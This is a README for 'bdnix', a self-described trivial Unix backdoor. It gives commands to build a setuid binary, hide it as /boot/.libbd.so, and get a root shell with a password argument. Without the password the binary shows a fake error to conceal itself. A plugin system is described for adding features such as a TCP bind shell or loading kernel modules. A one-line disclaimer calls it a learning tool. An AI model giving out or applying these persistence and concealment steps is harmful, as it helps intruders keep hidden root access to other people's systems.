 <pre>
 ___ ___  _  _ _____  __
 | _ )   \| \| |_ _\ \/ /
 | _ \ |) | .` || | >  < 
 |___/___/|_|\_|___/_/\_\
                         
Trivial userspace backdoor for Unix
Emanuele Paiano - nixw0rm@gmail.com

</pre>

<h3>This is a learning tool, so use it ONLY on your home systems (like 
Desktop PC or Raspberry Pi). I'm not responsable for abuses. 
Use it at your risk!  </h3>                         

------------------
 GETTING STARTED
------------------

1) Open root terminal in current directory and go into bdnix folder
  <pre>
   # cd /path/bdnix
   </pre>
2) From root run 'make' to build binary file
  <pre>
   # make
   </pre>
3) copy created file (i.e. libbd.so) with -p option to a hidden location like /bin, /etc,
<pre>
   # cp -p libbd.so /boot/.libbd.so
   # chmod +sx /boot/.libbd.so
   </pre>       
   and setuid file (chmod +x).


4) logout from server and log in again with unprivileged user. 


5) Run binary with joshua to enable backdoor
<pre>
   $ /boot/.libbd.so joshua /bin/sh

   if you see '#' then.. you are root! :)
   </pre>

6) if you run without joshua password, you can read a (fake) error:
<pre>
   /bin/sh: cannot execute binary file
   </pre>

---------------------
 CUSTOMIZE PASSWORD
---------------------

Opening settings.h you can change default password "joshua" (can you remember WOPR?):
<pre>
        #define ARG1 "joshua"
        </pre>
we can change it to "chips"
<pre>
        #define ARG1 "chips"
</pre>
Now recompiling (read above) and running with new password:
<pre>
        $ /boot/.libbd.so chips /bin/sh
        #
</pre>
If we have rootshell, it works! :)


------------------
 ENABLING PLUGINS
------------------
Plugins are .h file in plugins/ folders. By plugins you can add code portions and
add new functionaties to bdnix (i.e. binding shell on TCP port, loading kernel module, etc).
To enable a plugin:

1) Open settings.h include file and search for options like:
<pre><code>
        /* PLUGINS */

        /* enable rootshell */
        #define SHELL 1
        </code></pre>       
2) Change 1 to enable, or 0 to disable code.

Example. If you have rootshell disabled and myplugin enabled:

        /* enable rootshell */
        #define SHELL 0
        
        /* my plugin */
        #define MYPLUGIN 1
        
Your backdoor run MYPLUGIN code and ignore rootshell. You can enable more plugins together: 
all enabled plugins run in sequential mode. 

For adding or writing custom plugin, read WRITING A PLUGIN.


-------------------
 WRITING A PLUGIN
-------------------
1) If you need write plugin, you must create .h file into plugin using next template:

        int <PLUGIN_NAME>_init()
        {
          //code plugin
        }

   replacing <PLUGIN_NAME> with your plugin's name and write you code inside function. 

2) Open bdcode.c and find this code into main():

    #if SHELL == 1
      shell_init(argv[2]);
    #endif
    
   and edit previos code in this:
   
    #if SHELL == 1
      shell_init(argv[2]);
    #endif
    #if <PLUGIN_NAME> == 1
      <PLUGIN_NAME>_init();
    #endif

   removing <PLUGIN_NAME> with you plugin's name.

   TIPS EXAMPLE: You can start to write you plugin editing RAW plugin.



----------
 LICENSE
----------
This code is released under GNU/GPL3 terms, read COPYING for info.
